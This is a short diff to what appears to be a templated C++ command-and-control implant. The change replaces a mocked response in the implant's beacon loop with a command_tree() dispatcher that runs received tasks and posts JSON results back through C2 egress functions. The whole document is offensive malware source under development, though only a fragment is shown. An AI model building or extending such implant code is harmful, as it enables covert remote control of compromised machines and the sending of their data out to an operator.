@@ -13,7 +13,7 @@ Required Keys:
 #include "../data/msgpack/msgpack.h"
 //#include "../lifecycle/comms.cpp" //comms has all the funcs for comms, intentional import of .cpp, instead of .h for inline funcs/template build ease
 #include "settings.h"
-
+#include "commandtree.h"
 // ======================================================================================
 // 0. STATIC MEMBER DEFINITIONS
 // ======================================================================================
@@ -31,7 +31,7 @@ nlohmann::json [[ c2_get_profile.value ]](std::string implant_uuid);
 
 [%- for c2_post_profile in post_function_mappings.values() %]
 
-int [[ c2_post_profile.value ]](std::string implant_uuid, std::string output_data, std::string task_uuid);
+int [[ c2_post_profile.value ]](std::string implant_uuid, nlohmann::json output_data, std::string task_uuid);
 
 [%- endfor %]
 
@@ -118,15 +118,15 @@ void C2Implant::cycle() {
             std::string task_uuid = task_data["task_uuid"];
             std::cout << "[+] Received Task: " << task_uuid << std::endl;
 
+            //command tree
+            //for now, returning otuputs. In the future, this will need to be changed for a queue based system. 
+            nlohmann::json result_json = command_tree(task_data);
+
             // Execute Actions (Mocked)
-            std::string text_data = "If you see this it means the implant is talking to you";
+            //std::string text_data = "If you see this it means the implant is talking to you";
 
-            // Prepare Response
-            std::vector<uint8_t> task_response_as_msgpack;
-            create_task_response(implant_uuid_, task_uuid, text_data, task_response_as_msgpack);
-
-            // POST Response
-            s_egress_map[post](implant_uuid_, text_data, task_uuid);
+            // POST Response - this wraps it all up for us.
+            s_egress_map[post](implant_uuid_, result_json, task_uuid);
         }
         else {
             std::cout << "[.] No task or empty response. Sleeping..." << std::endl;
